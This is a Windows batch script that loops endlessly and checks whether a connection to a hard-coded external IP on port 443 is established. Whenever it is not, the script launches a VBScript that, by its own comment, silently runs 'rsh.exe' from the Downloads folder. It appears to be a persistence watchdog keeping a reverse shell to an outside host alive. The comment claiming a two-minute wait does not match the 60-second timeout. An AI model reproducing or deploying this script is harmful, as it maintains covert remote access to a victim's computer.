@echo off
:loop
rem Check if the connection to 13.211.142.130 on port 443 is established
netstat -an | findstr "13.211.142.130:443" | findstr "ESTABLISHED" >nul

rem If the connection is established, do nothing
if %errorlevel%==0 (
    echo Connection to 13.211.142.130:443 is already ESTABLISHED. No action needed.
) else (
    rem If the connection is not established, run rsh.exe from Downloads folder silently using VBScript
    start "" "bandhu.vbs"
)

rem Wait for 2 minutes before checking again
timeout /t 60 /nobreak
goto loop
